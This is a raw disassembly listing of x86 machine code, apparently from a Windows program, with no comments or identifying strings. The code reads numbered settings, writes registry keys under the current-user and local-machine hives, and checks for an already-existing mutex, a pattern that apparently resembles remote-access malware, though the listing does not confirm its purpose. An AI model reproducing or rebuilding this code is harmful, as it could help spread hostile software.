  4072c4:	50                   	push   %eax
  4072c5:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4072c8:	50                   	push   %eax
  4072c9:	8d 85 78 fe ff ff    	lea    -0x188(%ebp),%eax
  4072cf:	56                   	push   %esi
  4072d0:	50                   	push   %eax
  4072d1:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  4072d4:	ff 15 70 02 41 00    	call   *0x410270
  4072da:	50                   	push   %eax
  4072db:	8d 45 bc             	lea    -0x44(%ebp),%eax
  4072de:	50                   	push   %eax
  4072df:	e8 30 89 00 00       	call   0x40fc14
  4072e4:	83 c4 0c             	add    $0xc,%esp
  4072e7:	50                   	push   %eax
  4072e8:	ff 75 08             	push   0x8(%ebp)
  4072eb:	e8 24 89 00 00       	call   0x40fc14
  4072f0:	83 c4 0c             	add    $0xc,%esp
  4072f3:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  4072f6:	ff 15 54 02 41 00    	call   *0x410254
  4072fc:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  4072ff:	ff 15 54 02 41 00    	call   *0x410254
  407305:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  407308:	ff 15 54 02 41 00    	call   *0x410254
  40730e:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  407311:	ff 15 54 02 41 00    	call   *0x410254
  407317:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40731a:	ff 15 54 02 41 00    	call   *0x410254
  407320:	8b 45 08             	mov    0x8(%ebp),%eax
  407323:	5e                   	pop    %esi
  407324:	c9                   	leave
  407325:	c3                   	ret
  407326:	5c                   	pop    %esp
  407327:	71 40                	jno    0x407369
  407329:	00 66 71             	add    %ah,0x71(%esi)
  40732c:	40                   	inc    %eax
  40732d:	00 85 71 40 00 8f    	add    %al,-0x70ffbf8f(%ebp)
  407333:	71 40                	jno    0x407375
  407335:	00 99 71 40 00 5e    	add    %bl,0x5e004071(%ecx)
  40733b:	72 40                	jb     0x40737d
  40733d:	00 65 72             	add    %ah,0x72(%ebp)
  407340:	40                   	inc    %eax
  407341:	00 6c 72 40          	add    %ch,0x40(%edx,%esi,2)
  407345:	00 e8                	add    %ch,%al
  407347:	05 00 00 00 e9       	add    $0xe9000000,%eax
  40734c:	14 00                	adc    $0x0,%al
  40734e:	00 00                	add    %al,(%eax)
  407350:	55                   	push   %ebp
  407351:	8b ec                	mov    %esp,%ebp
  407353:	51                   	push   %ecx
  407354:	8d 45 ff             	lea    -0x1(%ebp),%eax
  407357:	b9 40 59 41 00       	mov    $0x415940,%ecx
  40735c:	50                   	push   %eax
  40735d:	e8 a5 c1 ff ff       	call   0x403507
  407362:	c9                   	leave
  407363:	c3                   	ret
  407364:	68 70 73 40 00       	push   $0x407370
  407369:	e8 4c 89 00 00       	call   0x40fcba
  40736e:	59                   	pop    %ecx
  40736f:	c3                   	ret
  407370:	b9 40 59 41 00       	mov    $0x415940,%ecx
  407375:	e9 c2 a7 ff ff       	jmp    0x401b3c
  40737a:	e8 05 00 00 00       	call   0x407384
  40737f:	e9 15 00 00 00       	jmp    0x407399
  407384:	55                   	push   %ebp
  407385:	8b ec                	mov    %esp,%ebp
  407387:	51                   	push   %ecx
  407388:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40738b:	b9 78 59 41 00       	mov    $0x415978,%ecx
  407390:	50                   	push   %eax
  407391:	ff 15 50 02 41 00    	call   *0x410250
  407397:	c9                   	leave
  407398:	c3                   	ret
  407399:	68 a5 73 40 00       	push   $0x4073a5
  40739e:	e8 17 89 00 00       	call   0x40fcba
  4073a3:	59                   	pop    %ecx
  4073a4:	c3                   	ret
  4073a5:	b9 78 59 41 00       	mov    $0x415978,%ecx
  4073aa:	ff 25 54 02 41 00    	jmp    *0x410254
  4073b0:	e8 05 00 00 00       	call   0x4073ba
  4073b5:	e9 15 00 00 00       	jmp    0x4073cf
  4073ba:	55                   	push   %ebp
  4073bb:	8b ec                	mov    %esp,%ebp
  4073bd:	51                   	push   %ecx
  4073be:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4073c1:	b9 50 59 41 00       	mov    $0x415950,%ecx
  4073c6:	50                   	push   %eax
  4073c7:	ff 15 50 02 41 00    	call   *0x410250
  4073cd:	c9                   	leave
  4073ce:	c3                   	ret
  4073cf:	68 db 73 40 00       	push   $0x4073db
  4073d4:	e8 e1 88 00 00       	call   0x40fcba
  4073d9:	59                   	pop    %ecx
  4073da:	c3                   	ret
  4073db:	b9 50 59 41 00       	mov    $0x415950,%ecx
  4073e0:	ff 25 54 02 41 00    	jmp    *0x410254
  4073e6:	e8 05 00 00 00       	call   0x4073f0
  4073eb:	e9 15 00 00 00       	jmp    0x407405
  4073f0:	55                   	push   %ebp
  4073f1:	8b ec                	mov    %esp,%ebp
  4073f3:	51                   	push   %ecx
  4073f4:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4073f7:	b9 88 59 41 00       	mov    $0x415988,%ecx
  4073fc:	50                   	push   %eax
  4073fd:	ff 15 bc 01 41 00    	call   *0x4101bc
  407403:	c9                   	leave
  407404:	c3                   	ret
  407405:	68 11 74 40 00       	push   $0x407411
  40740a:	e8 ab 88 00 00       	call   0x40fcba
  40740f:	59                   	pop    %ecx
  407410:	c3                   	ret
  407411:	b9 88 59 41 00       	mov    $0x415988,%ecx
  407416:	ff 25 c0 02 41 00    	jmp    *0x4102c0
  40741c:	e8 05 00 00 00       	call   0x407426
  407421:	e9 15 00 00 00       	jmp    0x40743b
  407426:	55                   	push   %ebp
  407427:	8b ec                	mov    %esp,%ebp
  407429:	51                   	push   %ecx
  40742a:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40742d:	b9 68 59 41 00       	mov    $0x415968,%ecx
  407432:	50                   	push   %eax
  407433:	ff 15 50 02 41 00    	call   *0x410250
  407439:	c9                   	leave
  40743a:	c3                   	ret
  40743b:	68 47 74 40 00       	push   $0x407447
  407440:	e8 75 88 00 00       	call   0x40fcba
  407445:	59                   	pop    %ecx
  407446:	c3                   	ret
  407447:	b9 68 59 41 00       	mov    $0x415968,%ecx
  40744c:	ff 25 54 02 41 00    	jmp    *0x410254
  407452:	55                   	push   %ebp
  407453:	8b ec                	mov    %esp,%ebp
  407455:	83 ec 4c             	sub    $0x4c,%esp
  407458:	53                   	push   %ebx
  407459:	56                   	push   %esi
  40745a:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40745d:	57                   	push   %edi
  40745e:	50                   	push   %eax
  40745f:	e8 ef 07 00 00       	call   0x407c53
  407464:	83 ec 0c             	sub    $0xc,%esp
  407467:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40746a:	8b cc                	mov    %esp,%ecx
  40746c:	50                   	push   %eax
  40746d:	ff 35 14 51 41 00    	push   0x415114
  407473:	ff 15 4c 02 41 00    	call   *0x41024c
  407479:	83 ec 10             	sub    $0x10,%esp
  40747c:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40747f:	8b cc                	mov    %esp,%ecx
  407481:	50                   	push   %eax
  407482:	ff 15 60 02 41 00    	call   *0x410260
  407488:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  40748b:	50                   	push   %eax
  40748c:	e8 24 7b 00 00       	call   0x40efb5
  407491:	83 c4 24             	add    $0x24,%esp
  407494:	bb 40 59 41 00       	mov    $0x415940,%ebx
  407499:	8b cb                	mov    %ebx,%ecx
  40749b:	50                   	push   %eax
  40749c:	e8 6f 10 00 00       	call   0x408510
  4074a1:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  4074a4:	e8 93 a6 ff ff       	call   0x401b3c
  4074a9:	68 cc 08 41 00       	push   $0x4108cc
  4074ae:	6a 0e                	push   $0xe
  4074b0:	8b cb                	mov    %ebx,%ecx
  4074b2:	e8 d2 9d ff ff       	call   0x401289
  4074b7:	50                   	push   %eax
  4074b8:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  4074bb:	68 48 10 41 00       	push   $0x411048
  4074c0:	50                   	push   %eax
  4074c1:	e8 54 87 00 00       	call   0x40fc1a
  4074c6:	83 c4 0c             	add    $0xc,%esp
  4074c9:	50                   	push   %eax
  4074ca:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4074cd:	50                   	push   %eax
  4074ce:	e8 4d 87 00 00       	call   0x40fc20
  4074d3:	83 c4 0c             	add    $0xc,%esp
  4074d6:	bf e8 57 41 00       	mov    $0x4157e8,%edi
  4074db:	8b cf                	mov    %edi,%ecx
  4074dd:	50                   	push   %eax
  4074de:	ff 15 64 02 41 00    	call   *0x410264
  4074e4:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  4074e7:	ff 15 54 02 41 00    	call   *0x410254
  4074ed:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  4074f0:	ff 15 54 02 41 00    	call   *0x410254
  4074f6:	33 f6                	xor    %esi,%esi
  4074f8:	68 34 10 41 00       	push   $0x411034
  4074fd:	56                   	push   %esi
  4074fe:	68 00 00 10 00       	push   $0x100000
  407503:	89 75 f8             	mov    %esi,-0x8(%ebp)
  407506:	ff 15 78 00 41 00    	call   *0x410078
  40750c:	3b c6                	cmp    %esi,%eax
  40750e:	74 0c                	je     0x40751c
  407510:	68 60 ea 00 00       	push   $0xea60
  407515:	50                   	push   %eax
  407516:	ff 15 80 01 41 00    	call   *0x410180
  40751c:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40751f:	8b cf                	mov    %edi,%ecx
  407521:	50                   	push   %eax
  407522:	68 30 10 41 00       	push   $0x411030
  407527:	ff 15 58 02 41 00    	call   *0x410258
  40752d:	50                   	push   %eax
  40752e:	68 01 00 00 80       	push   $0x80000001
  407533:	e8 5f 19 00 00       	call   0x408e97
  407538:	83 c4 10             	add    $0x10,%esp
  40753b:	84 c0                	test   %al,%al
  40753d:	74 1b                	je     0x40755a
  40753f:	68 30 10 41 00       	push   $0x411030
  407544:	8b cf                	mov    %edi,%ecx
  407546:	ff 15 58 02 41 00    	call   *0x410258
  40754c:	50                   	push   %eax
  40754d:	68 01 00 00 80       	push   $0x80000001
  407552:	e8 db 1b 00 00       	call   0x409132
  407557:	83 c4 0c             	add    $0xc,%esp
  40755a:	6a 0e                	push   $0xe
  40755c:	8b cb                	mov    %ebx,%ecx
  40755e:	e8 26 9d ff ff       	call   0x401289
  407563:	bf 78 59 41 00       	mov    $0x415978,%edi
  407568:	50                   	push   %eax
  407569:	8b cf                	mov    %edi,%ecx
  40756b:	ff 15 64 02 41 00    	call   *0x410264
  407571:	8b cf                	mov    %edi,%ecx
  407573:	ff 15 58 02 41 00    	call   *0x410258
  407579:	50                   	push   %eax
  40757a:	6a 01                	push   $0x1
  40757c:	56                   	push   %esi
  40757d:	ff 15 74 00 41 00    	call   *0x410074
  407583:	ff 15 3c 01 41 00    	call   *0x41013c
  407589:	3d b7 00 00 00       	cmp    $0xb7,%eax
  40758e:	75 08                	jne    0x407598
  407590:	6a 01                	push   $0x1
  407592:	5e                   	pop    %esi
  407593:	e9 a9 06 00 00       	jmp    0x407c41
  407598:	e8 9b 07 00 00       	call   0x407d38
  40759d:	e8 5e 9a ff ff       	call   0x401000
  4075a2:	68 04 01 00 00       	push   $0x104
  4075a7:	68 0c 58 41 00       	push   $0x41580c
  4075ac:	56                   	push   %esi
  4075ad:	ff 15 6c 00 41 00    	call   *0x41006c
  4075b3:	68 24 10 41 00       	push   $0x411024
  4075b8:	68 f4 0f 41 00       	push   $0x410ff4
  4075bd:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  4075c0:	68 02 00 00 80       	push   $0x80000002
  4075c5:	50                   	push   %eax
  4075c6:	e8 26 19 00 00       	call   0x408ef1
  4075cb:	83 c4 10             	add    $0x10,%esp
  4075ce:	bf 68 59 41 00       	mov    $0x415968,%edi
  4075d3:	8b cf                	mov    %edi,%ecx
  4075d5:	50                   	push   %eax
  4075d6:	ff 15 64 02 41 00    	call   *0x410264
  4075dc:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  4075df:	ff 15 54 02 41 00    	call   *0x410254
  4075e5:	e8 cb 7a 00 00       	call   0x40f0b5
  4075ea:	84 c0                	test   %al,%al
  4075ec:	74 07                	je     0x4075f5
  4075ee:	68 e8 0f 41 00       	push   $0x410fe8
  4075f3:	eb 05                	jmp    0x4075fa
  4075f5:	68 dc 0f 41 00       	push   $0x410fdc
  4075fa:	8b cf                	mov    %edi,%ecx
  4075fc:	ff 15 b4 01 41 00    	call   *0x4101b4
  407602:	a1 30 59 41 00       	mov    0x415930,%eax
  407607:	3b c6                	cmp    %esi,%eax
  407609:	74 07                	je     0x407612
  40760b:	ff d0                	call   *%eax
  40760d:	a3 1c 51 41 00       	mov    %eax,0x41511c
  407612:	39 75 f8             	cmp    %esi,-0x8(%ebp)
  407615:	75 6c                	jne    0x407683
  407617:	6a 2e                	push   $0x2e
  407619:	8b cb                	mov    %ebx,%ecx
  40761b:	e8 69 9c ff ff       	call   0x401289
  407620:	8b c8                	mov    %eax,%ecx
  407622:	ff 15 34 02 41 00    	call   *0x410234
  407628:	80 38 00             	cmpb   $0x0,(%eax)
  40762b:	74 56                	je     0x407683
  40762d:	39 35 30 59 41 00    	cmp    %esi,0x415930
  407633:	74 4e                	je     0x407683
  407635:	39 35 1c 51 41 00    	cmp    %esi,0x41511c
  40763b:	74 1f                	je     0x40765c
  40763d:	56                   	push   %esi
  40763e:	68 c4 0c 41 00       	push   $0x410cc4
  407643:	8b cf                	mov    %edi,%ecx
  407645:	ff 15 20 02 41 00    	call   *0x410220
  40764b:	8b 0d 9c 02 41 00    	mov    0x41029c,%ecx
  407651:	39 01                	cmp    %eax,(%ecx)
  407653:	75 2e                	jne    0x407683
  407655:	e8 01 b5 ff ff       	call   0x402b5b
  40765a:	eb 27                	jmp    0x407683
  40765c:	68 5c 07 41 00       	push   $0x41075c
  407661:	b9 e8 57 41 00       	mov    $0x4157e8,%ecx
  407666:	ff 15 58 02 41 00    	call   *0x410258
  40766c:	50                   	push   %eax
  40766d:	68 01 00 00 80       	push   $0x80000001
  407672:	e8 d7 17 00 00       	call   0x408e4e
  407677:	83 c4 0c             	add    $0xc,%esp
  40767a:	84 c0                	test   %al,%al
  40767c:	75 05                	jne    0x407683
  40767e:	e8 f5 b3 ff ff       	call   0x402a78
  407683:	6a 27                	push   $0x27
  407685:	8b cb                	mov    %ebx,%ecx
  407687:	e8 fd 9b ff ff       	call   0x401289
  40768c:	8b c8                	mov    %eax,%ecx
  40768e:	ff 15 34 02 41 00    	call   *0x410234
  407694:	80 38 00             	cmpb   $0x0,(%eax)
  407697:	74 05                	je     0x40769e
  407699:	e8 1a 0e 00 00       	call   0x4084b8
  40769e:	6a 0b                	push   $0xb
  4076a0:	8b cb                	mov    %ebx,%ecx
  4076a2:	e8 e2 9b ff ff       	call   0x401289
  4076a7:	8b c8                	mov    %eax,%ecx
  4076a9:	ff 15 58 02 41 00    	call   *0x410258
  4076af:	50                   	push   %eax
  4076b0:	b9 f8 57 41 00       	mov    $0x4157f8,%ecx
  4076b5:	ff 15 d8 02 41 00    	call   *0x4102d8
  4076bb:	6a 04                	push   $0x4
  4076bd:	8b cb                	mov    %ebx,%ecx
  4076bf:	e8 c5 9b ff ff       	call   0x401289
  4076c4:	8b c8                	mov    %eax,%ecx
  4076c6:	ff 15 34 02 41 00    	call   *0x410234
  4076cc:	80 38 00             	cmpb   $0x0,(%eax)
  4076cf:	6a 05                	push   $0x5
  4076d1:	8b cb                	mov    %ebx,%ecx
  4076d3:	0f 95 c0             	setne  %al
  4076d6:	a2 08 58 41 00       	mov    %al,0x415808
  4076db:	e8 a9 9b ff ff       	call   0x401289
  4076e0:	8b c8                	mov    %eax,%ecx
  4076e2:	ff 15 34 02 41 00    	call   *0x410234
  4076e8:	80 38 00             	cmpb   $0x0,(%eax)
  4076eb:	6a 06                	push   $0x6
  4076ed:	8b cb                	mov    %ebx,%ecx
  4076ef:	0f 95 c0             	setne  %al
  4076f2:	a2 11 59 41 00       	mov    %al,0x415911
  4076f7:	e8 8d 9b ff ff       	call   0x401289
  4076fc:	8b c8                	mov    %eax,%ecx
  4076fe:	ff 15 34 02 41 00    	call   *0x410234
  407704:	80 38 00             	cmpb   $0x0,(%eax)
  407707:	6a 07                	push   $0x7
  407709:	8b cb                	mov    %ebx,%ecx
  40770b:	0f 95 c0             	setne  %al
  40770e:	a2 10 59 41 00       	mov    %al,0x415910
  407713:	e8 71 9b ff ff       	call   0x401289
  407718:	8b c8                	mov    %eax,%ecx
  40771a:	ff 15 34 02 41 00    	call   *0x410234
  407720:	80 38 00             	cmpb   $0x0,(%eax)
  407723:	6a 08                	push   $0x8
  407725:	8b cb                	mov    %ebx,%ecx
  407727:	0f 95 c0             	setne  %al
  40772a:	a2 e0 57 41 00       	mov    %al,0x4157e0
  40772f:	e8 55 9b ff ff       	call   0x401289
  407734:	8b c8                	mov    %eax,%ecx
  407736:	ff 15 34 02 41 00    	call   *0x410234
  40773c:	80 38 00             	cmpb   $0x0,(%eax)
  40773f:	6a 03                	push   $0x3
  407741:	8b cb                	mov    %ebx,%ecx
  407743:	0f 95 c0             	setne  %al
  407746:	a2 c8 57 41 00       	mov    %al,0x4157c8
  40774b:	e8 39 9b ff ff       	call   0x401289
  407750:	8b c8                	mov    %eax,%ecx
  407752:	ff 15 34 02 41 00    	call   *0x410234
  407758:	80 38 00             	cmpb   $0x0,(%eax)
  40775b:	74 66                	je     0x4077c3
  40775d:	6a 30                	push   $0x30
  40775f:	8b cb                	mov    %ebx,%ecx
  407761:	e8 23 9b ff ff       	call   0x401289
  407766:	8b c8                	mov    %eax,%ecx
  407768:	ff 15 58 02 41 00    	call   *0x410258
  40776e:	8b f8                	mov    %eax,%edi
  407770:	83 c9 ff             	or     $0xffffffff,%ecx
  407773:	33 c0                	xor    %eax,%eax
  407775:	f2 ae                	repnz scas %es:(%edi),%al
  407777:	f7 d1                	not    %ecx
  407779:	49                   	dec    %ecx
  40777a:	74 47                	je     0x4077c3
  40777c:	6a 30                	push   $0x30
  40777e:	8b cb                	mov    %ebx,%ecx
  407780:	e8 04 9b ff ff       	call   0x401289
  407785:	8b c8                	mov    %eax,%ecx
  407787:	ff 15 58 02 41 00    	call   *0x410258
  40778d:	50                   	push   %eax
  40778e:	6a 09                	push   $0x9
  407790:	8b cb                	mov    %ebx,%ecx
  407792:	e8 f2 9a ff ff       	call   0x401289
  407797:	8b c8                	mov    %eax,%ecx
  407799:	ff 15 34 02 41 00    	call   *0x410234
  40779f:	8a 00                	mov    (%eax),%al
  4077a1:	50                   	push   %eax
  4077a2:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  4077a5:	50                   	push   %eax
  4077a6:	e8 84 f9 ff ff       	call   0x40712f
  4077ab:	83 c4 0c             	add    $0xc,%esp
  4077ae:	b9 18 59 41 00       	mov    $0x415918,%ecx
  4077b3:	50                   	push   %eax
  4077b4:	ff 15 64 02 41 00    	call   *0x410264
  4077ba:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  4077bd:	ff 15 54 02 41 00    	call   *0x410254
  4077c3:	39 75 f8             	cmp    %esi,-0x8(%ebp)
  4077c6:	0f 85 92 01 00 00    	jne    0x40795e
  4077cc:	6a 03                	push   $0x3
  4077ce:	8b cb                	mov    %ebx,%ecx
  4077d0:	e8 b4 9a ff ff       	call   0x401289
  4077d5:	8b c8                	mov    %eax,%ecx
  4077d7:	ff 15 34 02 41 00    	call   *0x410234
  4077dd:	80 38 00             	cmpb   $0x0,(%eax)
  4077e0:	74 77                	je     0x407859
  4077e2:	6a 1e                	push   $0x1e
  4077e4:	8b cb                	mov    %ebx,%ecx
  4077e6:	e8 9e 9a ff ff       	call   0x401289
  4077eb:	8b c8                	mov    %eax,%ecx
  4077ed:	ff 15 34 02 41 00    	call   *0x410234
  4077f3:	80 38 00             	cmpb   $0x0,(%eax)
  4077f6:	8b cb                	mov    %ebx,%ecx
  4077f8:	0f 95 c0             	setne  %al
  4077fb:	50                   	push   %eax
  4077fc:	6a 0c                	push   $0xc
  4077fe:	e8 86 9a ff ff       	call   0x401289
  407803:	8b c8                	mov    %eax,%ecx
  407805:	ff 15 34 02 41 00    	call   *0x410234
  40780b:	80 38 00             	cmpb   $0x0,(%eax)
  40780e:	8b cb                	mov    %ebx,%ecx
  407810:	0f 95 c0             	setne  %al
  407813:	50                   	push   %eax
  407814:	6a 0a                	push   $0xa
  407816:	e8 6e 9a ff ff       	call   0x401289
  40781b:	8b c8                	mov    %eax,%ecx
  40781d:	ff 15 58 02 41 00    	call   *0x410258
  407823:	50                   	push   %eax
  407824:	6a 30                	push   $0x30
  407826:	8b cb                	mov    %ebx,%ecx
  407828:	e8 5c 9a ff ff       	call   0x401289
  40782d:	8b c8                	mov    %eax,%ecx
  40782f:	ff 15 58 02 41 00    	call   *0x410258
  407835:	50                   	push   %eax
  407836:	6a 09                	push   $0x9
  407838:	8b cb                	mov    %ebx,%ecx
  40783a:	e8 4a 9a ff ff       	call   0x401289
  40783f:	8b c8                	mov    %eax,%ecx
  407841:	ff 15 34 02 41 00    	call   *0x410234
  407847:	8a 00                	mov    (%eax),%al
  407849:	50                   	push   %eax
  40784a:	e8 be ec ff ff       	call   0x40650d
  40784f:	83 c4 14             	add    $0x14,%esp
  407852:	bf d0 57 41 00       	mov    $0x4157d0,%edi
  407857:	eb 12                	jmp    0x40786b
  407859:	bf d0 57 41 00       	mov    $0x4157d0,%edi
  40785e:	68 0c 58 41 00       	push   $0x41580c
  407863:	8b cf                	mov    %edi,%ecx
  407865:	ff 15 d8 02 41 00    	call   *0x4102d8
  40786b:	68 4c 0f 41 00       	push   $0x410f4c
  407870:	b9 e8 57 41 00       	mov    $0x4157e8,%ecx
  407875:	ff 15 58 02 41 00    	call   *0x410258
  40787b:	50                   	push   %eax
  40787c:	68 01 00 00 80       	push   $0x80000001
  407881:	e8 c8 15 00 00       	call   0x408e4e
  407886:	83 c4 0c             	add    $0xc,%esp
  407889:	84 c0                	test   %al,%al
  40788b:	0f 85 8a 00 00 00    	jne    0x40791b
  407891:	8b cf                	mov    %edi,%ecx
  407893:	ff 15 90 02 41 00    	call   *0x410290
  407899:	40                   	inc    %eax
  40789a:	50                   	push   %eax
  40789b:	e8 2c 84 00 00       	call   0x40fccc
  4078a0:	59                   	pop    %ecx
  4078a1:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4078a4:	8b cf                	mov    %edi,%ecx
  4078a6:	ff 15 58 02 41 00    	call   *0x410258
  4078ac:	8b f8                	mov    %eax,%edi
  4078ae:	83 c9 ff             	or     $0xffffffff,%ecx
  4078b1:	33 c0                	xor    %eax,%eax
  4078b3:	f2 ae                	repnz scas %es:(%edi),%al
  4078b5:	f7 d1                	not    %ecx
  4078b7:	2b f9                	sub    %ecx,%edi
  4078b9:	8b c1                	mov    %ecx,%eax
  4078bb:	8b f7                	mov    %edi,%esi
  4078bd:	8b 7d f4             	mov    -0xc(%ebp),%edi
  4078c0:	c1 e9 02             	shr    $0x2,%ecx
  4078c3:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4078c5:	8b c8                	mov    %eax,%ecx
  4078c7:	83 e1 03             	and    $0x3,%ecx
  4078ca:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4078cc:	be 50 59 41 00       	mov    $0x415950,%esi
  4078d1:	8b ce                	mov    %esi,%ecx
  4078d3:	ff 15 90 02 41 00    	call   *0x410290
  4078d9:	50                   	push   %eax
  4078da:	8b ce                	mov    %esi,%ecx
  4078dc:	ff 15 58 02 41 00    	call   *0x410258
  4078e2:	50                   	push   %eax
  4078e3:	b9 d0 57 41 00       	mov    $0x4157d0,%ecx
  4078e8:	ff 15 90 02 41 00    	call   *0x410290
  4078ee:	40                   	inc    %eax
  4078ef:	b9 e8 57 41 00       	mov    $0x4157e8,%ecx
  4078f4:	50                   	push   %eax
  4078f5:	ff 75 f4             	push   -0xc(%ebp)
  4078f8:	68 4c 0f 41 00       	push   $0x410f4c
  4078fd:	ff 15 58 02 41 00    	call   *0x410258
  407903:	50                   	push   %eax
  407904:	68 01 00 00 80       	push   $0x80000001
  407909:	e8 c2 17 00 00       	call   0x4090d0
  40790e:	ff 75 f4             	push   -0xc(%ebp)
  407911:	e8 16 83 00 00       	call   0x40fc2c
  407916:	83 c4 20             	add    $0x20,%esp
  407919:	33 f6                	xor    %esi,%esi
  40791b:	68 44 08 41 00       	push   $0x410844
  407920:	6a 0d                	push   $0xd
  407922:	8b cb                	mov    %ebx,%ecx
  407924:	e8 60 99 ff ff       	call   0x401289
  407929:	50                   	push   %eax
  40792a:	ff 15 a4 02 41 00    	call   *0x4102a4
  407930:	59                   	pop    %ecx
  407931:	84 c0                	test   %al,%al
  407933:	59                   	pop    %ecx
  407934:	74 28                	je     0x40795e
  407936:	6a 0d                	push   $0xd
  407938:	8b cb                	mov    %ebx,%ecx
  40793a:	e8 4a 99 ff ff       	call   0x401289
  40793f:	83 ec 10             	sub    $0x10,%esp
  407942:	8b cc                	mov    %esp,%ecx
  407944:	50                   	push   %eax
  407945:	ff 15 60 02 41 00    	call   *0x410260
  40794b:	e8 bb 04 00 00       	call   0x407e0b
  407950:	83 c4 10             	add    $0x10,%esp
  407953:	3c 01                	cmp    $0x1,%al
  407955:	75 07                	jne    0x40795e
  407957:	6a 03                	push   $0x3
  407959:	e9 34 fc ff ff       	jmp    0x407592
  40795e:	6a 28                	push   $0x28
  407960:	8b cb                	mov    %ebx,%ecx
  407962:	e8 22 99 ff ff       	call   0x401289
  407967:	8b c8                	mov    %eax,%ecx
  407969:	ff 15 58 02 41 00    	call   *0x410258
  40796f:	50                   	push   %eax
  407970:	ff 15 9c 03 41 00    	call   *0x41039c
  407976:	8b 3d 98 01 41 00    	mov    0x410198,%edi
  40797c:	3c 02                	cmp    $0x2,%al
  40797e:	59                   	pop    %ecx
  40797f:	a2 38 59 41 00       	mov    %al,0x415938
  407984:	75 04                	jne    0x40798a
  407986:	6a 01                	push   $0x1
  407988:	eb 05                	jmp    0x40798f
  40798a:	3c 01                	cmp    $0x1,%al
  40798c:	75 13                	jne    0x4079a1
  40798e:	56                   	push   %esi
  40798f:	e8 59 81 00 00       	call   0x40faed
  407994:	59                   	pop    %ecx
  407995:	56                   	push   %esi
  407996:	56                   	push   %esi
  407997:	56                   	push   %esi
  407998:	68 bf f8 40 00       	push   $0x40f8bf
  40799d:	56                   	push   %esi
  40799e:	56                   	push   %esi
  40799f:	ff d7                	call   *%edi
  4079a1:	6a 0f                	push   $0xf
  4079a3:	8b cb                	mov    %ebx,%ecx
  4079a5:	e8 df 98 ff ff       	call   0x401289
  4079aa:	8b c8                	mov    %eax,%ecx
  4079ac:	ff 15 58 02 41 00    	call   *0x410258
  4079b2:	8a 00                	mov    (%eax),%al
  4079b4:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  4079b7:	a2 18 51 41 00       	mov    %al,0x415118
  4079bc:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4079bf:	50                   	push   %eax
  4079c0:	ff 15 50 02 41 00    	call   *0x410250
  4079c6:	68 68 06 41 00       	push   $0x410668
  4079cb:	6a 31                	push   $0x31
  4079cd:	8b cb                	mov    %ebx,%ecx
  4079cf:	e8 b5 98 ff ff       	call   0x401289
  4079d4:	50                   	push   %eax
  4079d5:	ff 15 38 02 41 00    	call   *0x410238
  4079db:	59                   	pop    %ecx
  4079dc:	84 c0                	test   %al,%al
  4079de:	59                   	pop    %ecx
  4079df:	74 44                	je     0x407a25
  4079e1:	6a 11                	push   $0x11
  4079e3:	8b cb                	mov    %ebx,%ecx
  4079e5:	e8 9f 98 ff ff       	call   0x401289
  4079ea:	8b c8                	mov    %eax,%ecx
  4079ec:	ff 15 58 02 41 00    	call   *0x410258
  4079f2:	50                   	push   %eax
  4079f3:	6a 10                	push   $0x10
  4079f5:	8b cb                	mov    %ebx,%ecx
  4079f7:	e8 8d 98 ff ff       	call   0x401289
  4079fc:	8b c8                	mov    %eax,%ecx
  4079fe:	ff 15 34 02 41 00    	call   *0x410234
  407a04:	8a 00                	mov    (%eax),%al
  407a06:	50                   	push   %eax
  407a07:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  407a0a:	50                   	push   %eax
  407a0b:	e8 1f f7 ff ff       	call   0x40712f
  407a10:	83 c4 0c             	add    $0xc,%esp
  407a13:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  407a16:	50                   	push   %eax
  407a17:	ff 15 64 02 41 00    	call   *0x410264
  407a1d:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  407a20:	e9 9d 00 00 00       	jmp    0x407ac2
  407a25:	6a 31                	push   $0x31
  407a27:	8b cb                	mov    %ebx,%ecx
  407a29:	e8 5b 98 ff ff       	call   0x401289
  407a2e:	8b c8                	mov    %eax,%ecx
  407a30:	ff 15 58 02 41 00    	call   *0x410258
  407a36:	50                   	push   %eax
  407a37:	6a 10                	push   $0x10
  407a39:	8b cb                	mov    %ebx,%ecx
  407a3b:	e8 49 98 ff ff       	call   0x401289
  407a40:	8b c8                	mov    %eax,%ecx
  407a42:	ff 15 34 02 41 00    	call   *0x410234
  407a48:	8a 00                	mov    (%eax),%al
  407a4a:	50                   	push   %eax
  407a4b:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  407a4e:	50                   	push   %eax
  407a4f:	e8 db f6 ff ff       	call   0x40712f
  407a54:	83 c4 0c             	add    $0xc,%esp
  407a57:	b9 20 57 41 00       	mov    $0x415720,%ecx
  407a5c:	50                   	push   %eax
  407a5d:	ff 15 64 02 41 00    	call   *0x410264
  407a63:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  407a66:	ff 15 54 02 41 00    	call   *0x410254
  407a6c:	56                   	push   %esi
